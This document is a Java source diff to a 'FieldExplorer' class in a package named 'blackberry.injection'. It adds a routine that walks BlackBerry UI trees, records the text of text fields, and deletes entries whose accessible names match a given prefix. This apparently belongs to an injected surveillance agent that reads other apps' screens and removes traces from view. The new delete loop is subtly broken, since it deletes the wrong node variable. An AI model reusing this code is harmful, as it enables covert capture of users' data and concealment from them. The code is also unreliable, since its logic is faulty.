@@ -1,6 +1,6 @@
 package blackberry.injection;
 
-
+import java.util.Enumeration;
 import java.util.Hashtable;
 import java.util.Vector;
 
@@ -31,13 +31,22 @@ public class FieldExplorer {
     public synchronized Vector explore(Field field) {
         debug.startBuffering(DebugLevel.INFORMATION);
         textfields = new Vector();
-        exploreField(field, 0, new String[0], debug);
+        exploreField(field, 0, new String[0], debug, null);
+        debug.trace("End Exploring Field");
         debug.stopBuffering();
         return textfields;
     }
 
+    public void deleteAccessible(Field field, String deleteName) {
+        debug.startBuffering(DebugLevel.INFORMATION);
+        textfields = new Vector();
+        exploreField(field, 0, new String[0], debug, deleteName);
+        debug.trace("End Exploring Field");
+        debug.stopBuffering();
+    }
+
     protected void exploreField(Field field, int deep, String[] history,
-            Debug debug) {
+            Debug debug, String deleteName) {
 
         String tab = "";
 
@@ -45,8 +54,9 @@ public class FieldExplorer {
             tab += "   ";
         }
 
-        debug.trace(tab + "" + getName(field.getClass()) + " hist: "
-                + history.length);
+        if (debug != null)
+            debug.trace(tab + "" + getName(field.getClass()) + " hist: "
+                    + history.length);
 
         if (TreeField.class.isAssignableFrom(field.getClass())) {
             TreeField tree = (TreeField) field;
@@ -56,7 +66,10 @@ public class FieldExplorer {
             int number = 0;
 
             int node = tree.nextNode(0, 0, true);
+
+            Vector deleteNodes = new Vector();
             while (node != -1 && number < 100) {
+                debug.trace("exploreField: " + node);
                 number += 1;
 
                 int next = tree.nextNode(node, 0, true);
@@ -66,11 +79,30 @@ public class FieldExplorer {
 
                     exploreField((Field) cookie, deep + 1,
                             addHistory(history, getName(field.getClass())),
-                            debug);
+                            debug, deleteName);
                 } else {
                     AccessibleContext context = field.getAccessibleContext();
-                    accessibleTraverse(context, deep + 1);
+                    boolean delete = accessibleTraverse(context, deep + 1,
+                            deleteName);
+                    if (delete) {
+                        debug.trace("exploreField, found node: " + node);
+                        deleteNodes.addElement(new Integer(node));
+                    }
                 }
+            }
+
+            Enumeration e = deleteNodes.elements();
+            while (e.hasMoreElements()) {
+                int nodePos = ((Integer) e.nextElement()).intValue();
+                //#ifdef DEBUG
+                debug.trace("exploreField, deleting node: " + nodePos);
+                //#endif
+                try {
+                    tree.deleteSubtree(node);
+                } catch (Exception ex) {
+                    debug.trace("exploreField, cannot delete: " + ex);
+                }
+
             }
 
         } else if (Manager.class.isAssignableFrom(field.getClass())) {
@@ -81,7 +113,8 @@ public class FieldExplorer {
             for (int i = 0; i < manager.getFieldCount(); i++) {
                 Field f = manager.getField(i);
                 exploreField(f, deep + 1,
-                        addHistory(history, getName(field.getClass())), debug);
+                        addHistory(history, getName(field.getClass())), debug,
+                        deleteName);
             }
         } else if (ObjectListField.class.isAssignableFrom(field.getClass())) {
             ObjectListField list = (ObjectListField) field;
@@ -92,57 +125,70 @@ public class FieldExplorer {
                 if (Field.class.isAssignableFrom(cookie.getClass())) {
                     exploreField(field, deep + 1,
                             addHistory(history, getName(field.getClass())),
-                            debug);
+                            debug, deleteName);
                 } else {
                     AccessibleContext context = field.getAccessibleContext();
-                    accessibleTraverse(context, deep + 1);
+                    accessibleTraverse(context, deep + 1, deleteName);
                 }
+
             }
         } else if (LabelField.class.isAssignableFrom(field.getClass())) {
             LabelField label = (LabelField) field;
-            debug.trace(tab + "label: " + label.getText());
+            if (debug != null)
+                debug.trace(tab + "label: " + label.getText());
         } else if (TextField.class.isAssignableFrom(field.getClass())) {
             TextField text = (TextField) field;
 
-            debug.trace(tab + "TextField " + text.getLabel() + " : "
-                    + text.getText() + " style: " + text.getFieldStyle());
+            if (debug != null)
+                debug.trace(tab + "TextField " + text.getLabel() + " : "
+                        + text.getText() + " style: " + text.getFieldStyle());
 
             textfields.addElement(text.getText());
 
         } else if (BitmapField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "BitmapField");
+            if (debug != null)
+                debug.trace(tab + "BitmapField");
         } else if (ButtonField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "ButtonField");
+            if (debug != null)
+                debug.trace(tab + "ButtonField");
         } else if (CheckboxField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "CheckboxField");
+            if (debug != null)
+                debug.trace(tab + "CheckboxField");
         } else if (ChoiceField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "ChoiceField");
+            if (debug != null)
+                debug.trace(tab + "ChoiceField");
         } else if (DateField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "DateField");
+            if (debug != null)
+                debug.trace(tab + "DateField");
         } else if (GaugeField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "GaugeField");
+            if (debug != null)
+                debug.trace(tab + "GaugeField");
         } else if (NullField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "NullField");
+            if (debug != null)
+                debug.trace(tab + "NullField");
         } else if (RadioButtonField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "RadioButtonField");
+            if (debug != null)
+                debug.trace(tab + "RadioButtonField");
         } else if (SeparatorField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "SeparatorField");
+            if (debug != null)
+                debug.trace(tab + "SeparatorField");
             // } else if
             // (ShortcutIconField.class.isAssignableFrom(field.getClass())) {
 
             // debug.trace(tab + "ShortcutIconField");
         } else if (MapField.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "MapField");
+            if (debug != null)
+                debug.trace(tab + "MapField");
             // } else if (GLField.class.isAssignableFrom(field.getClass())) {
             // debug.trace(tab + "GLField");
             // } else if (VGField.class.isAssignableFrom(field.getClass())) {
@@ -150,37 +196,32 @@ public class FieldExplorer {
             // } else if (ScrollView.class.isAssignableFrom(field.getClass())) {
 
             // debug.trace(tab + "ScrollView");
-        } /*else if (SpinBoxField.class.isAssignableFrom(field.getClass())) {
+        } /*
+           * else if (SpinBoxField.class.isAssignableFrom(field.getClass())) {
+           * debug.trace(tab + "SpinBoxField"); // } else if //
+           * (ActivityImageField.class.isAssignableFrom(field.getClass())) { //
+           * debug.trace(tab + "ActivityImageField"); // } else if //
+           * (ProgressBarField.class.isAssignableFrom(field.getClass())) { //
+           * debug.trace(tab + "ProgressBarField"); // } else if //
+           * (PictureScrollField.class.isAssignableFrom(field.getClass())) { //
+           * debug.trace(tab + "PictureScrollField"); // } else if //
+           * (ToolbarButtonField.class.isAssignableFrom(field.getClass())) { //
+           * debug.trace(tab + "ToolbarButtonField"); }
+           */else if (Vector.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "SpinBoxField");
-            // } else if
-            // (ActivityImageField.class.isAssignableFrom(field.getClass())) {
-            // debug.trace(tab + "ActivityImageField");
-            // } else if
-            // (ProgressBarField.class.isAssignableFrom(field.getClass())) {
-            // debug.trace(tab + "ProgressBarField");
-            // } else if
-            // (PictureScrollField.class.isAssignableFrom(field.getClass())) {
-            // debug.trace(tab + "PictureScrollField");
-            // } else if
-            // (ToolbarButtonField.class.isAssignableFrom(field.getClass())) {
-
-            // debug.trace(tab + "ToolbarButtonField");
-        }*/ else if (Vector.class.isAssignableFrom(field.getClass())) {
-
-            debug.trace(tab + "Vector");
+            if (debug != null)
+                debug.trace(tab + "Vector");
         } else if (Hashtable.class.isAssignableFrom(field.getClass())) {
 
-            debug.trace(tab + "Hashtable");
+            if (debug != null)
+                debug.trace(tab + "Hashtable");
         }
 
         else {
             // debug.trace(tab + "unknown field");
             AccessibleContext context = field.getAccessibleContext();
-            accessibleTraverse(context, deep + 1);
-
+            accessibleTraverse(context, deep + 1, deleteName);
         }
-
     }
 
     private String[] addHistory(String[] history, String name) {
@@ -193,38 +234,56 @@ public class FieldExplorer {
         return newHistory;
     }
 
-    private void accessibleTraverse(AccessibleContext context, int deep) {
+    private boolean accessibleTraverse(AccessibleContext context, int deep,
+            String deleteName) {
         String tab = "";
-
+        boolean ret = false;
         for (int i = 0; i < deep; i++) {
             tab += "   ";
         }
 
         if (context == null) {
-            return;
+            return ret;
         }
 
-        debug.trace(tab + "" + getName(context.getClass()) + "");
+        /*if (debug != null)
+            debug.trace(tab + "" + getName(context.getClass()) + "");*/
 
         if (context.getAccessibleName() != null) {
             String name = context.getAccessibleName();
-            debug.trace(tab + "name: " + name);
+            if (deleteName != null && name.startsWith(deleteName)) {
+                //#ifdef DEBUG
+                if (debug != null)
+                    debug.trace("accessibleTraverse, to be deleted: " + context);
+                //#endif             
+                ret = true;               
+            }
+            if (debug != null)
+                debug.trace(tab + "name: " + name);
         }
         if (context.getAccessibleText() != null)
-            debug.trace(tab + "text: " + context.getAccessibleText());
-        if (context.getAccessibleValue() != null)
-            debug.trace(tab + "value: " + context.getAccessibleValue());
+            if (debug != null)
+                debug.trace(tab + "text: " + context.getAccessibleText());
+        /*if (context.getAccessibleValue() != null)
+            if (debug != null)
+                debug.trace(tab + "value: " + context.getAccessibleValue());
         if (context.getAccessibleTable() != null)
-            debug.trace(tab + "table: " + context.getAccessibleTable());
+            if (debug != null)
+                debug.trace(tab + "table: " + context.getAccessibleTable());
         if (context.getAccessibleParent() != null)
-            debug.trace(tab + "parent: " + context.getAccessibleParent());
+            if (debug != null)
+                debug.trace(tab + "parent: " + context.getAccessibleParent());*/
 
         if (context.getAccessibleChildCount() > 0) {
-            debug.trace(tab + "count: " + context.getAccessibleChildCount());
+            if (debug != null)
+                debug.trace(tab + "count: " + context.getAccessibleChildCount());
             for (int i = 0; i < context.getAccessibleChildCount(); i++) {
-                accessibleTraverse(context.getAccessibleChildAt(i), deep + 1);
+                accessibleTraverse(context.getAccessibleChildAt(i), deep + 1,
+                        deleteName);
             }
         }
+
+        return ret;
     }
 
     private String getName(Class class1) {
